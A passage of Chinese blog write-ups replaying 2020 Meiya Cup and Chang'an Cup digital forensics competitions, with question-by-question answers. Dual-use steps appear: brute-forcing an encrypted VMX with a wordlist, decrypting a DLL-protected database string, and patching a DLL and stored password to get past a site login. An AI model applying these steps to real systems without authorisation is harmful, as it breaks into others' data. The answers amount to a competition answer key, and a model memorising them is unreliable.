好像kali的hashcat有问题，换win跑\n\n最后换成16进制即可，得到!VCHWEDfdfd2IOA564356:&quot;:&quot;\n得到BitLocker，赶紧去解压硬盘494208-639155-079684-230648-428923-176902-004312-663696\n可以看到得到了三个文件\n\n其中db应该是对应检材二的数据库服务器文件，也就是网站重构需要的数据库部分；decrypt文件解压，解压密码又是我们熟悉的niuroumian6。\n看了wp发现没人重构出来网站，都是通过零零散散的线索拼凑出来的答案。\n比如这道题我们在分析检材二的时候曾查过数据库日志，里面曾对用户名为admin的账号密码作过修改，因此答案就是C\n\n\n\nwe.tar解压后得到了网站的模板图片\n\n\nD\n\n\n\n这个被加密数据库就是db，计算即可8dcf2f71482bb492b546eec746c714be9324ea254778bf5cbb9e5115b30c77a2\nA\n\n\n\n首先应该明确该ddos程序就是指的嫌疑人购买的runit\n\n\n\n逆向方面的让队友来吧。。。\n\n\n\n我们找到后解压查看，可以看到就是个密钥文件\n\n\n\n\n\nC\n\n\n\n还是找历史记录，前面我们已经知道其来自edge\nhttps://pan.forensix.cn/seafhttp/files/8fdf1982-e323-4efe-ae28-2bba21b5162c/runit -&gt; D\n\n\n\n\nB\n\n\n\n​    md，只能在时间线上找到 -&gt; B\n\n\n\n\n\n完成应该就是修改时间 -&gt; C\n\n\n考察细心了，有好几个浏览器呢\n这个是谷歌的， 没有匹配上的\n\n\n\n这个是edge，有匹配上的 -&gt; A\n\n\n\n\n浏览器上找不到了，按照选项来看    -&gt; B\n\n\n\n\nD\n终于做完了… 感觉是目前做的最难的一套，综合考察能力很强。对逆向和重构还不是很会\n","tags":["电子数据取证"]},{"title":"20年美亚杯电子数据取证团队赛复现","url":"/2022/10/27/20%E5%B9%B4%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%9B%A2%E9%98%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/","content":"案例背景\n你的电子数据取证调查结果发现一个国际黑客组织牵涉这宗案件。经深入调查后，调查队伍相信该黑客组织入侵了一个名为Zello的本地网上商店官网，黑客组织也针对另一家网上商店Xeno发动网络攻击，使其系统产生故障。调查期间发现三名男子: 张伟华、冯启礼及罗俊杰疑与该案有关。警方在搜查他们的住宅及公司后扣押了数十台电子设备。请分析电子数据证据并重建入侵痕迹。\n\nZello服务器部分\nZello服务器的哈希值（SHA256）是甚么\n30B856EEE5121EDC2F9DC19ACFC8720E443810CBC5B83128EC62F9F4AAEAACC9\n\n卷组是何时创建的？\nlvdisplay\n\n\n卷组的名称是甚么？\nlvm 的相关概念pv：physical volume，物理磁盘，比如一整块固态硬盘vg：volume group，即卷组，比如Windows里的新建卷lv：logical volume，逻辑磁盘，比如c盘、d盘\n同上可知，ubuntu-vg\n\n物理卷的PV UUID是多少？\n与LVM同理，可利用\npvdisplay\n\n\n卷组的VG UUID是甚么？\nvgdisplay\n\n\nZello服务器的Linux内核版本是甚么？\nuname -a\n\n\nZello服务器的操作系统版本是甚么？\n\n\nZello服务器的主机名是甚么？\ncat /etc/hostname\n\n\nZello服务器的计算器ID是甚么？ \n这里指的是计算机的ID，找半天计算器。。。\ncat /etc/machine-id\n\n\nZello服务器中使用的wordpress版本是甚么？\n从config中可以逐步找到对应页面/wp-includes/version.php\n \n\nZello服务器与之同步的主机名是甚么？\n/etc/hosts或者/etc/ntp.conf\n\n\n\nZello服务器的时区是甚么？ \ntimedatectl\n\n\n有多少个本地用户已登录到Zello服务器？\n/etc/passwd\n 每行各个字段标识\n\n普通用户有两个特征：一是UID介于500~65535之间；二是shell的起始位置为/bin/bash\n\n\n植入网络目录（Webdirectory）的网页壳层（Web Shell）的哈希值（MD5）是甚么？\n翻译过来就是找马\n一种思路就是查杀软件直接全扫一遍\n360真是菜，马都查不出\n反正最后可以找到/wp-includes/sales/info/123.php\nECFD5B5E56D56C6BBA6E1BAD595BFC0C\n\n\\ var \\ www \\ html \\ wordpress \\net \\ 2020 \\ Login \\ index.php有甚么作用\n这波是代码审计，啊也不是，一打开看发现是个大部分html构成的登录页面，本地搭建一下看看\n\n这就是个钓鱼网站，可以钓账号密码\n\n钓鱼网站伪装成甚么网站？ \n上题即可知，NETFLIX\n\n下列哪个IP对Zello服务器进行了蛮力攻击？\n也就是爆破一类，我们看下日志\n日志文件位于/var/log/apache2/目录下，有几个压缩包比较可疑error.log.x.gz\n解压后查看，其中203.186.94.68被匹配了1432次，很不正常，第一明显的就是DOS行为\n\n\nZello Web服务器的URL是甚么？ \n看hosts ntp.conf或者浏览器历史记录均可\n\n域名 zello-onlineshop.sytes.net\n\nLVM2容器的第一个扇区是什么？\n\nLVM2指的是分区6，起始扇区为2101248\n\nZello服务器中LVM2容器的大小（以字节为单位）是甚么？\n每块扇区512字节\n也就是31,135,367,168\n\n在Zello服务器以及Alice的装置中可以找到甚么共同文件？\n果然跟个人赛中的信息还有关联\n历史记录里翻一番\n\nR3ZZ.txt\n\n2020年8月29日在Xeno服务器中发现的攻击类型是甚么？\n没看到这一天的日志啊，不过翻一番会发现请求方式和url基本一致\n\n所以是HTTP GET/POST Flood\n\n哪个IP地址在日志中条目数量最多？\n14.102.184.0匹配了10000项\n\n\n这个登录次数最多的IP地址，它访问最多的是哪个页面？\n还是查日志匹配文本可以看到\n\n\n\n所以是risk.xhtml\n\n这个登录次数最多的IP地址来自哪个国家或地区？ \n其实可以之间ip查询的，但是线索应该就是在题目材料中，翻一番\n\n所以可以知道攻击Xeno服务器的就是罗俊杰\n也对应了报告，原来都是线索\n\n\n这个登录次数最多的IP地址，合共有多少次成功登录?\n\n\n\n这个感觉还是定位的不准确\n\n除DDoS之外，还可能涉及其他攻击吗？\n虽然日志给的并不是很详细，但是一般都会爆破一下账号密码\n\n从该网站下载了多少数据？\n这也看不出来啥数据传输格式或者data啥的，所以现在还推不出来\n\n\nBob路由器\nBob路由器的型号是甚么？\n\n\nBob家的IP地址是甚么？\n27.111.174.91\n\n使用路由器的装置的Mac地址是甚么-Alice？\n这道题跟底下的引出了个人赛的人物关系，Bob Alice和Cole，其中我们已经知道了Cole是一个Boss\n并且有一份路由器日志可供参考\n\nBob的Mac地址为\n\n所以可以判断BigBoss指的就是Bob\n\n使用路由器的装置的Mac地址是甚么-Cole？\n在Cole的桌上计算机对应的MAC\n\n\n谁到访过Bob的家？\nCole\n\n\n我们针对上面的题在Bob的其他设备上找答案\nBob的笔记本\n\nBob的笔记本计算机的哈希值（SHA-1）是甚么？ \n5DF01AC2194A74804DEB0F7332532D39711C5770\n\n笔记本计算机中安装了甚么电子邮件程序？\n\n\n网络钓鱼电子邮件的接收者是储存在甚么文件？ \n\n面向选择题去找线索NETFLX.htm.dump\n\n在Bob的笔记本, 有什么可疑APK及其功能？\n在C:\\APK下有一堆APK\n\n结合第39题可以定位到mytracker.bak\n上面可以检查虚拟货币的价格\n\n该可疑APK 从什么网站获取资料? \n抓包并没抓到什么可疑流量\n只能暴力搜索关键词\ngrep xxx ./mytracker/ -nr# -r 当指定要查找的是目录而非文件时，必须使用这项参数，否则grep指令将回报信息并停止动作# -n 在显示符合样式的那一行之前，标示出该行的列数编号\n\n\n得到https://rest.coinapi.io/v1/exchangerate\n\n上述APK中发现的Bitlocker密钥是甚么？\n741852963\n\n\n网络钓鱼网站的网页寄存的网站地址是甚么？\nBob的浏览器历史记录中存在该链接\n\n我们在网站服务器上去验证一下是否存在该钓鱼页面\n\n\n\nBob的桌上计算机打开后显示需要输入BitLocker，用之前apk得到的\n\n\nBob的桌上计算机的哈希值（SHA-256）是甚么？ \n86C740D5FB096A18CC419AF74D7A55389F28D7F8E1CE6FABD17371E66E1C2673\n\nBob的桌上计算机的安装时间是几点？(本地时间)\n\n\nBob桌上计算机内发现的网络钓鱼脚本是甚么？(某些字符被刻意用*遮盖) \n翻一番可以看到一个script目录比较可疑，里面存在inter.zip\n\n我们提取出来分析一波\n大致看了一下，从index.php分析出了主要干的事，获取header中的ip，然后查询对应的国家和访问仿真的时间并记录，其他几个文件里还有收集其他信息的函数，所以可以推断出收集个人数据\n\n\n\nBob iphone仿真分析的时候遇到了备份密码，在配置文件里面可以找到\n\n\n在Bob iphone, 与Alice和Cole通讯记录的完整路径是甚么？\n在前面个人赛中，我们能回忆到他们三人的通讯工具是WhatsApp\n\n这个ZCHATSESSION字段和群组ID有关，我们找一下对应是4\n\n\nBob的iPhone的苹果ID是甚么？\n\n\nBob的iPhone的IMEI是甚么？\n\n\nBob iPhone的时区设置是甚么？\n取证软件里又没有，我们暴力搜索一波\ngrep &quot;UTC&quot; ./ -nr\n\n\n\n其实配置文件里也有相关的\n\n\n文件“ VIP.txt”的完整路径是甚么？\n在和cole的文件传输记录中找到了vip.txt\n\n前缀不太好搞Bob/mobile/Containers/Shared/AppGroup/group.net.whatsapp.WhatsApp.shared/Message/Media/85262547937-1600392878@g.us/c/5/c56255d0-a407-4341-afef-7bf5accc52f0.txt\n\n在Bob iphone, 谁是“ 85262547937-1600392878@g.us”的聊天群组中的管理员？\n![image-20221025002017294](20年美亚杯团队赛复现/image-20221025002017294.png\n\n\n\nAlice有添加成员的操作，所以她是，而且看她的欢迎词就可以知道\n同时数据库里也有相关记录\n\n\n\n“ 85262547937-1600392878@g.us”聊天群组中有多少个附件？\n细心一些，这几个文件夹下共4个附件，没法只看聊天记录来分析\n \n\nBob iPhone的Airdrop ID是甚么？\n暴力搜索一波\n没搜到…\n盲猜也是66E7BBDE9F69其他都有可识别的字符串信息，但是没搜到相关的\n\nBob的iPhone的操作系统版本是甚么？\n\n\nBob在2020-09-17的1451时访问的连结是甚么？(UTC + 0)\n注意时差回退8小时\n\n\n\nBob的Samsung\nBob的Samsung S2的Android ID是甚么？\n全局搜索\n\n\nBob的Samsung S2的操作系统版本是甚么？\n \n\nBob Samsung S2的时区设置是甚么？\n\n\n“ bitcoin.PNG”的储存位置是甚么？\n\n\nbitcoin.PNG的哈希值（SHA-256）是甚么？ \n\n\nBob的Samsung S2的wifi mac地址是甚么？\n\n\n“ userdata（ExtX）/ Root / media /Download / APK Testing”中的有多少APK檔？\n\n10个\n\nMessagesecure.apk的哈希值（SHA-256）是甚么？\n\n\n私钥已在bitcoin.PNG中加密。私钥是甚么？\n上面这个软件已经在个人赛中出现，图片加密信息。对于解密密钥的话，思路是如果没有直接的线索的话，就把之前得到的所有密码都试一下，这里用的就是Bob桌上计算机的开机密码Aa654321\n\nKzZUc6yaEjPd7NgBBRz9yUAf447Ei74K8rwuxoia8paBjzDNNpqG\n\napk文件“ flash_chat”的哈希值（SHA-256）是甚么？\n这题出的好突兀啊，得去Alice的手机里找。。。\n\n\n\n哪个文件包含“ flash_chat”聊天记录？\n这个软件没账号，分析里也没记录，只能一个个找了    \n\n\n从“ flash_chat”找到的Bob的Windows密码是甚么？(某些字符被刻意用*遮盖)\n仔细翻有好几个密码信息\n\n\n\n消息的消息号码(Message ID)是甚么？ \n\n\n\n\n“ flash_chat”消息ID“aGqBnI5Bxutv24SQvrBL”中的密码是甚么？(某些字符被刻意用*遮盖)\n就是上面图里找到的helloworld\n\n\nBob的IMAC 计算机\n从Bob iMAC 桌面名为Wallet.dat 的档案中可以取得以下那一个比特币地址?(某些字符被刻意用*遮盖)\nmd有个开机密码没绕过去，我超绕过去了，就是之前的开机密码Aa654321\n真的费劲儿\n\n3KHtnfnLp7P8Vu7EA4uUJzkngnXxGMZWwo\n\n从Wallet.dat档案中取得的比特币地址，那一个有接收及传送过比特币?(某些字符被刻意用*遮盖)\n去比特币交易网查看交易记录https://www.blockchain.com/explorer/assets/btc\n上面那个地址没有交易记录，还得再找，又有一个，我们拿去验证一下\n3HeQp9c74rqN6ymzGwr9JB7z8CPaX2458w\n\n\n\n以下那一个比特币接收或传送交易的哈希值与上述的比特币地址有直接关系？(某些字符被刻意用*遮盖)\n\n\n上述的比特币交易中所涉及多少比特币？\n由题目69可出 0.01459400 BTC\n\nBob iMac数据磁盘的哈希值（SHA-256）是甚么？\nF83929D4217939E37A4408FAE745363A4635A18CB0EE2E29771449E86F8BD7E7\n\n\nCole桌上计算机\n\nCole桌上计算机的哈希值（SHA-1）是甚么？\n0D00A8A853B9001A9FC7BF89D9FBBA790C065CE2\n\nCole桌上计算机的用户名是甚么？\nCole\n\n在Cole的桌上计算机中发现了多少潜在的受害者？ \n在vips.txt中可以看到200个潜在受害者\n\n\n潜在受害者的数据被储存在哪里?(某些字符被刻意用*遮盖)\n\n\n预设浏览器何时安装？\n\n\nCole桌上计算机上预设安装了甚么浏览器？\n\nInternet Explorer\n\n上述储存浏览记录的默认浏览器,该文件档案的类型是什么？\n\ndat\n\n入侵Zello的证据文件是甚么？\n结合上下文，从浏览器发起的攻击，我们在个人赛还记得这个是个马\n\n\n受感染网站的网址是什么?\n那必然是http://zello-onlineshop.sytes.net\n\nCole桌上计算机上的DDoS勒索字条是甚么？\n\n\n\nRansome Note of **OS.txt\n\n在Cole桌上计算机上发现的DDoS勒索字条中，比特币钱包地址是甚么？\n1L6fKWpEYvUi8FeG6BnXqfh1joAgmJA1h1\n\n\nCole的手提电脑\n\nCole笔记本计算机的哈希值（SHA-1）是甚么？\n9CD259C89F2C5E6A2E02CFF13DBD61E423B82EF5\n\nCole笔记本计算机有多少个用户帐户？\n3个\n\n\n当前登录用户帐户的用户名是甚么？\nCole\n\n在Cole笔记本的随机存取记忆体中, 是甚么Windows配置文件？ \n随机存取记忆体就是对应的RAM，涉及了内存取证的知识了\n速查：https://forensics.xidian.edu.cn/wiki/ram/\n内存已经帮我们DUMP下来了，我们直接开始分析\n\n先查系统摘要，硬件架构\nvolatility.exe -f &quot;A:\\Meiya Cup 2020\\Image\\Cole\\Ram dump from Cole\\coleramdump.mem&quot; imageinfo\n\nWin7SP1x64\n\n用户密码的前5个字符是甚么？\n火眼仿真时直接出，78945\n\n计算机中可疑的txt文件的名称是甚么？ \n能找到的txt就这两个\n\n不过都没找到具体文件，应该是已经被删了，参考前面几个检材选出来\n\n可疑txt文件曾经出现在哪个路径？\nC:/Users/Cole/Desktop/\n\n是否有任何证据表明该文件已执行？\n\n\n以下哪个与上述可疑txt文件相关的发现是正确的？ \n这个customer.txt同样可疑\n我们先定位vips.txt的时间\n\n我们可以看到访问用的是notepad\n\n可以看到几分钟后就访问了customer.txt\n\n\n根据系统时间，Cole在2020-09-18 01:01:08UTC + 0000左右用笔记本计算机做了甚么？\n注意时区，这里是UTC+0，所以还要再往后8小时\n\n\n\n他删除了一些文件\n\nFTK Imager.exe的PID是甚么? \n内存取证知识，查看运行时进程号\nvolatility.exe -f &quot;A:\\Meiya Cup 2020\\Image\\Cole\\Ram dump from Cole\\coleramdump.mem&quot; --profile=Win7SP1x64 pslist | grep FTK Imager.exe\n\n\n\n2456\n\nFTK Imager.exe的父应用程序是甚么？\n也就是PPID 660\n对应explorer.exe\n\nFTK Imager.exe使用甚么DLL？\ndlllist: 列出某一进程加载的所有dll文件\nvolatility.exe -f &quot;A:\\Meiya Cup 2020\\Image\\Cole\\Ram dump from Cole\\coleramdump.mem&quot; --profile=Win7SP1x64 -p 2456 dlllist  | findstr sensapi.dll\n\n\nMpCmdRun.exe的PID是甚么? \npslist：该插件列举出系统进程，但它不能检测到隐藏或者解链的进程，psscan可以\n\n\n\n1288\n\n以下哪个与MpCmdRun.exe相关的项目是正确？\n\n可以看到由svchost.exe启动的，终止于2020-09-18 01:20:57 UTC+0000\n\n上次启动后，笔记本计算机连接的外部IP是甚么？\n查看当前的网络连接情况可以使用netscan模块，该模块会列出所有实时的网络连接信息，包括使用的协议类型、源地址、目的地址、双方的端口号、连接状态(LISTENING、CLOSED等)\n volatility.exe -f &quot;A:\\Meiya Cup 2020\\Image\\Cole\\Ram dump from Cole\\coleramdump.mem&quot; --profile=Win7SP1x64 netscan\n\n\n\n可以看到未连接/未连接到任何外部IP\n\n上次启动后，笔记本计算机连接的网络驱动器路径是甚么？ \n未连接/未连接到任何外部IP\n\nCole公司的一位客户有一封电子邮件m*b*@ms**.z**.**.tw，可以在Cole的笔记本计算机中找到此数据吗?（某些字符被故意用*遮盖）\n这个其实在vip.txt中可以找到，但是Cole笔记本中不知道为啥看不到了\n但是可以找到的\n\n\n收到上述电子邮件的客户名称是甚么？\n陈宜\n\n属于上述客户的电话号码是甚么？\n626566826\n\n上述客户可能居住的区域是甚么？\nTIN SHUI WAI\n\n\nCole的Raspberry Pi 4\nCole的PI的哈希值（SHA-256）是甚么？\nEABC9BECCFA67E825864EBAB7B503EEC293C6209CDC931016D2F1D081F7C0556\n\nCole PI 装置的操作系统是甚么？ \n\n\n操作系统是甚么版本？\n\n\n装置的文件系统是甚么？ \n\next4\n\n操作系统的时区是甚么？\n不知道为啥仿真不了，手动查看/etc/timezone\n\n\n哪个文件包含儿童色情物品内容？（某些字符被故意用*遮盖）\n这个我们找一下历史记录，发现了一个可疑的文件操作\n\n去/var目录下看看，3个复制的照片都是\n\n\n\nB\n\nCole PI装置中的儿童色情物品的创建时间是甚么？\n见上图，2020/09/15 17:21\n\n\nCole的NAS装置啥叫NAS？\n\nNAS（Network Attached Storage：网络附属存储）按字面简单说就是连接在网络上，具备资料存储功能的装置，因此也称为“网络存储器”。它是一种专用数据存储服务器。它以数据为中心，将存储设备与服务器彻底分离，集中管理数据，从而释放带宽、提高性能、降低总拥有成本、保护投资。其成本远远低于使用服务器存储，而效率却远远高于后者。\n\n\nCole NAS的哈希值（SHA-256）是甚么?\n5B79890D90B661183F6849469FA2042D103D629A6BC9A4304E39B13C019D2871\n\n儿童色情数据存放在哪里？\n我们在火眼查看时可以发现分区3中很多内容都没有，需要动态磁盘恢复，利用xways\n\nPartition 3\\cole-shared\\media\n\n设备中现有多少儿童色情数据？\n从上图可知3个\n\nCole NAS装置中的儿童色情物品的创建时间是甚么？\n\n\n\nCole的手提电话\n在Cole手机, 的用户个人资料是甚么？ \nnmd我说为啥加载不出来镜像，正确的手机bin文件在补充文件里。。。\n算了小爷不做了\n\n\nDaniel 的桌上计算机\n\nDaniel的桌上计算机的哈希值（SHA-256）是甚么?\n07DD40CF28603F421F3A09CD38F1C8AA40A2AC4BFB46ECF8299C38CE6AE44ED5\n\n该桌上计算机操作系统储存在哪个分区上？\n火眼会误导人，\n\n\n实际在分区2\n\n在桌上计算器机中找到Daniel的电子邮件地址是甚么？\n\n\n该恶意软件感染源是甚么？ \n\n一个非官方授权的邮件，可以看到会诱导点击链接\n\n因此恶意软件的感染源来自一封邮件\n\n在Daniel的桌面上发现了甚么恶意软件？(某些字符被刻意用*遮盖)\n\n桌面上并不存在啥软件，但是Downloads下有这些，我们通过邮件访问链接对应的历史记录来排查\n\n因此可以确定就是video_viewer_3.1.2.4.zip\n\n该恶意软件的哈希值（SHA-256）是甚么？\n火眼崩了，分析挂载失败55555\n\n该恶意软件的功能是甚么？ \n逆向的同学来搞一下吧，nnd免杀做的挺好\n答案：远程桌面协议\n\n\nDaniel的MacBook\nDaniel的MacBook 计算机的哈希值（SHA-1）是甚么?\nC71C21730461FC901FD99F76C3679C3FED0DFAB9\n\nDaniel的MacBook 计算机中有多少个分区？\n\n2个\n\n\nDaniel 的iPhone\nDaniel的iPhone的操作系统是甚么版本？ \niphone需要输入备份密码\n\n\nDaniel的iPhone的wifi mac地址是甚么？\n\n\n\n\nDaniel的iPhone的IMEI是甚么？ \n证物照片中有\n\n\niPhone上次连接WIFI的SSID是甚么？ \n这个没办法了，猜不出弱密码就完，密码是1234\n\n\n根据调查结果，以下哪项关于Daniel的选项是正确的？\n因为点击邮件而被种马 所以都不是\n\n\n​     \n","tags":["电子数据取证"]},{"title":"20年长安杯电子数据取证复现","url":"/2022/08/01/20%E5%B9%B4%E9%95%BF%E5%AE%89%E6%9D%AF%E7%94%B5%E5%AD%90%E6%95%B0%E6%8D%AE%E5%8F%96%E8%AF%81%E5%A4%8D%E7%8E%B0/","content":"检材一 服务器取证\n操作系统版本\n\n火眼仿真取证软件查看\n\n\n查看操作系统内核\n\n\n查看lvm开始的逻辑区块地址\n\n\n\n\n\n\ncat /etc/nginx/conf.d/www.kkzjc.com\n\n\n\n与上面差不多，查看/etc/nginx/conf.d下有多少个虚拟主机\n\n\n查看服务器的原始IP\n查看docker的日志\n\n\n\n192.168.99.3\n\n关键词：远程登录\n\n\nlast命令直接查看 （pts/0代表远程登录设备）\n\n192.168.99.222\n\n\n\n\n\n查看容器内部的nginx服务虚拟主机配置文件\n\n192.168.1.176\n\n\n\nwc命令用于统计-l指定统计行数\ndocker logs 08 | grep 192.168.99.222 | wc -l\n\n检材二 Windows取证\n\n\n\n\n火眼证据分析查看即可\n\n\n\n\n\n在仿真中查看OS版本号\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n8次\n\n\n\n\n\n8091\n\n\n\n\n检材一netstat -anpt查看8091端口对应的服务进程名称或者 ps -aux 查看所有进程\n\n\ndocker-proxy\n\n\n\n\n查看本地域名服务器的配置，该网站ip为192.168.99.3，查看对应的域名是否存在\nc:\\windows\\system32\\drivers\\etc\n\nwww.sdhj.com\n之后在C盘中可以看到一个手机的备份tar包，导出添加该检材\n\n手机取证也算是介质取证\n\n\n\n\n\nsstt119999\n19.\n\n\ntelegram\n\n\n\n\n\ndogdogcoin\n\n\n\n\n见上图\n\n\n\n\nhttps://doge.tokenview.com/上面根据收款地址去查看交易信息\n\n\n\n\n\n\n4000\n在检材二里面还有一台虚拟机，但是被进行了加密\n\n在火眼中导出单独分析，记住存放\n\n\n虚拟磁盘解密技术\n\n\n​    其实题中也有提示\n\nhttps://github.com/search?q=vmx+cracker&amp;type=\nkali下暴力破解vmx\npython3 pyvmx-cracker.py -v Windows\\ 10\\ x64.vmx -d wordlist.txt \n\nzzzxxx\n加密解决后要先移除加密才能在取证软件中进行仿真\n​    \n\n\n\n\n\ncertutil -hashfile &quot;C:\\Users\\hl\\Desktop\\广告 拷贝.jpg&quot; SHA256\n\ncc7ea3ab90ab6b28417e08c715c243ce58ea76d71fd141b93f055a58e9ba561a\n\n\n\n\n\n\n\n\n\n\nhonglian7001\n\n\n\n\n检材1所在的服务器IP为192.168.99.3\n\n使用的是Xshell 进行了ssh连接\n\n\n\n\n\nqwer1234!@#$\n检材三  网站取证\n\n\n\n\n\nFF593FCCB3770B8845A3334631F8E80807638EE722C5AA7B34E877589857C3BA\n\n\n\n\n\nC\n\n\n\n​    \n\n\n\n\n\nC:\\inetpub\\wwwroot\\v7w\n\n\n\n\n见上图，80端口\n\n\n\n\n回忆检材2中犯罪人登录服务器时的url都是http://192.168.99.3:8091/dl\n所以可以考虑到这是一个登录接口，我们查看Web.config来以此分析登录的路由规则\n\n所以对应的文件即为dllogin.aspx\n\n\n\n\n\n前端处理 OvO\n\n\n\n\n在头部可以看到登录过程中所指定加载继承的类名，也就是后台管理登录的页面\n\n在/bin中即可找到对应的dll文件\n\nApp_Web_dllogin.aspx.7d7c2f33.dll\n\n\n\n\n利用dll逆向工具dnSpy对上面的dll进行分析\n\n找到对应的处理逻辑代码就可以看到，在接收密码参数后调用了AESEncrypt函数\n\n\n\n一解全开\n\n\n\n\n\n\n192.168.1.174   c4f2737e88   1433\n从这里可以看到连接数据库的配置信息也被进行了AES的加密处理，所以我们需要手动将其进行解密\n\n利用本地PowerShell，直接调用对应动态链接库中的函数即可，由命名空间和分支可以看到链接库为DBManager.dll\n\nAdd-Type -path .\\DBManager.dll[DBManager.Encryption]::AESDecrypt(&quot;Mcyj19i/VubvqSM21YPjWnnGzk8G/GG6x9+qwdcOJd9bTEyprEOxs8TD9Ma1Lz1Ct72xlK/g8DDRAQ+X0GtJ8w==&quot;, &quot;HL&quot;, &quot;forensix&quot;)\n\n检材四 网站重构取证\n\n\n\n\nE5E548CCAECD02608A0E053A5C7DCDBFBDD4BE5B0E743EB9DC8E318C369BEBC8\n重构数据库\n由检材3我们已知数据库IP 192.168.1.174\n但是DHCP服务使得虚拟机的IP是动态分配，无法被外界所访问。因此我们应先修改虚拟机的IP配置，使之固定可被访问\n修改方式：https://segmentfault.com/a/1190000017535131\n大致过程：关掉主机对虚拟机的DHCP服务，设置虚拟机的静态IP\n修改添加的内容为\nBOOTPROTO=&quot;static&quot; #dhcp改为static ONBOOT=&quot;yes&quot; #开机启用本配置IPADDR=192.168.1.174 #静态IPGATEWAY=192.168.1.1 #默认网关NETMASK=255.255.255.0 #子网掩码\n修改后再去查看ip\n\n同时，在检材3的服务器上可以ping通\n\n最终终于可以连上网站！\n\n之后的任务便是在库中找到可以成功登录的用户名和密码\n再次关注之前的后台链接库的代码\n\n分析可知，提取出前端的域名、用户名和密码输入后，传递给了数据库中的内置方法PD_UserLogin\n对sql语句进行分析\n---用户登录CREATE PROC PD_UserLogin@Domain\tVARCHAR(50),@Ln\t\tVARCHAR(50),@Pwd\tVARCHAR(50)ASDECLARE @OK\tINT,@Did INTSET @OK=8SET @Did=0SELECT @OK=DW_Type,@Did=DW_DU_ID FROM TD_Webs WHERE DW_Web=@DomainIF(@OK=0)BEGIN\tSELECT DU_Id,DU_State FROM TD_User \tWHERE DU_Id=@Did AND DU_Ln=@Ln AND DU_Pwd=@Pwd AND DU_ISDel=0ENDIF(@OK=1)BEGIN\tSELECT DU_Id,DU_State FROM TD_User \tWHERE DU_Ln=@Ln AND DU_Pwd=@Pwd AND DU_ISDel=0ENDgo\n这里面首先先查了TD_Webs表去筛选域名，并将DW_Type赋值给了@OK。\n\n再去看TD_User表，我们可以发现如果@OK=0的话，会选择DU_Id=1001 1003 1004的用户\n@OK=1的话会选择DU_id=1001 1003 1004 1005 1006，这里做出了一个域名限制操作\n1000和1002无法通过的\n\n从检材2的用户列表当中结合此我们可以确定嫌疑人使用的账户是1001（也看不出啥其他的了）\n然后我们就要去判断用户名和密码在数据库的存储方式，再去分析dll\n经过分析可知 密码经过了AES -&gt; base64 -&gt; MD5处理 用户名以明文形式存储\n\n而我们只需要在数据库中修改成我们已知的密码再经过加密即可。\n这里还可以看到在前端会有JS回显，我们可以将其中的内容修改为密码处经过加密后的输出结果，方便我们修改\n\n修改，编译后替换掉原服务器的dll文件，进行测试\n​    \n这时输入密码为123456，就可以直接得到加密处理的结果，替换数据库中的原数据。\n\n直接修改并不能通过，这里的坑1在还需要启动ASP .net服务才能生效，相当于MVC框架还没连起来？\n\n坑2在于还有域名限制，所以我们要把现在服务器的ip添加进去\n登录成功！网站重构成功！\n\n\n\n\n\nhttp://www.xxxx.com:8787/reg?id=abe6d2ee630379c3\n\n\n\n\n\n前面首页的用户列表统计一下数量即可 共计26个\n\n\n\n\n对比着前端显示的用户信息，去数据库里看一下，发现是TU_User这张表，里面有32个用户 UU_ISDel 表示用户信息是否已经被删除\n\n\n\n\n\n这块数据金额要进行统计，使用爬虫或者网镜导出到Excel进行统计，先留个坑…\n\n\n138408\n\n\n\n\nsql查一下\n\n\n\n\n\n在用户列表中会发现，每一个下属代理自身还有一个后台\n\n点击跳转后发现url不完整，添加前面的http头和ip\n\n最终就到了用户后代的管理后台\n\n\n账户余额为1066449\n\n\n\n\n\nd0fdd7a9a010d37e\n\n\n\n\n\n2016-09-05 17:09:13\n","tags":["电子数据取证"]},{"title":"20年美亚杯电子数据取证个人赛复现","url":"/2022/10/20/20%E7%BE%8E%E4%BA%9A%E6%9D%AF%E5%A4%8D%E7%8E%B0/","content":"案情背景\n2020年9月，数名信用卡持有人向警方报案，指他们的信用卡被不知名人士在一家本地网上商店购买手机。订单大部分来自海外的网络地址，但有一宗订单来自本地。警方经调查后发现该本地网络地址的注册地址。上门后在该处发现陈慧贤，她否认与案件有关。\n警方在现场检获一部笔记本计算机、一部手提电话及一个外置储存装置。在场的初步应变小队在检取证物前，曾为现场环境及证物拍照。另外, 调查队伍亦由网络供货商及网上商店取得了一些与案有关的资料。现在你被委派处理这宗案件, 请由以下的资料分析陈慧贤在本案中有否犯罪, 还原事件经过。\n\n笔记本计算机的数码法理档案\nAlice的笔记本计算机已成功被取证并制作成镜像(Forensic Image), 下列哪个是镜像的SHA-1哈希值?\n启动火眼仿真和分析，账号如下\n\n计算SHA-1：EB4854774B68058E5B327907DB2AC40AAA2E7DED\n\nAlice的笔记本计算机安装了哪个操作系统(Operating System)?\n\n\n在Alice的笔记本, 创建用户帐户的SID是甚么？\nSID是什么？\n\nSID也就是安全标识符（Security Identifiers），是标识用户、组和计算机帐户的唯一的号码。在第一次创建该帐户时，将给网络上的每一个帐户发布一个唯一的 SID。Windows 2000 中的内部进程将引用帐户的 SID 而不是帐户的用户或组名。如果创建帐户，再删除帐户，然后使用相同的用户名创建另一个帐户，则新帐户将不具有授权给前一个帐户的权力或权限，原因是该帐户具有不同的 SID 号。安全标识符也被称为安全 ID 或 SID。\n\n\n\n在Alice的笔记本,用户的最后登录时间是甚么时候？(本地时间)\n\n\n在Alice的笔记本,最后登录的用户名称是甚么？\nAlice\n\nAlice笔记本计算机的名称是甚么？\n\n\n在Alice的笔记本, 最后登录的用户何时更改了Windows登录密码？ （当地时间）\n\n\nAlice笔记本计算机的时区是甚么？\n\nUTC+8:00指的是CST，即中国标准时间\n\n在Alice的笔记本, OS分区的文件系统是甚么？\n\n\n计算机上预设安装了甚么浏览器？\n\n\n在Alice的笔记本,哪个是最常用的浏览器？\n看数据量可以知道是Edge，然而选项里没有\n\n在Alice的笔记本, 最常用的浏览器是甚么版本？\n\n\n在Alice的笔记本, Alice浏览了哪个在线商店的网站\n\n\n\n\n在Alice的笔记本, 受害人的信用卡号是甚么?（Ho PCKYI-电子邮件：shy1211@mtzh.gow.tw）\n我们在最近访问中（以及邮箱的垃圾箱里）找到了两个可疑的txt文件，其中R3ZZ中有一系列银行卡号以及所对应的受害者IP。我们尝试搜索shy1211@mtzh.gow.tw\n\n\n在Alice的笔记本, 